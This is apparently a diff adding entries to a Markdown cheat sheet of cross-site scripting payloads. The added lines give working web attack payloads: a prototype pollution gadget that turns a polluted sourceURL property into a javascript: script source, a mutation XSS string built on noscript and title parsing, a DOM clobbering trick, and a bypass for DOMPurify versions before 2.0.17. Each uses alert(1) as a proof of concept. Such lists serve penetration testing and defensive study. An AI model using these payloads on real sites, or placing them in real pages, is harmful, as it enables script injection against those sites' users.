@@ -144,6 +144,30 @@ fetch('/api/csrf-token')
 </script>
 ```
 
+### Prototype Pollution to XSS
+*Used when a vulnerable object merger allows polluting `Object.prototype`.*
+```javascript
+// [NEW] Affecting libraries like jQuery or GTM
+Object.prototype.sourceURL = "javascript:alert(1)"; // Polluting property
+// Later in code: (script.src = config.sourceURL || "default.js") => script.src becomes malicious
+```
+
+### Mutation XSS (mXSS)
+*Exploits how browsers "fix" malformed HTML when using innerHTML.*
+```html
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+```
+*When read via innerHTML, the browser may close the noscript tag early, firing the payload.*
+
+### Sanitizer Bypasses (DOMPurify/clobbering)
+```html
+<!-- DOM Clobbering to bypass logic -->
+<img id=config><a id=config name=url href="javascript:alert(1)">
+
+<!-- [NEW] DOMPurify <2.0.17 bypass via <template> -->
+<svg><p><style><template><img src="x" onerror="alert(1)">
+```
+
 ---
 
 ## 🧪 Injection Context
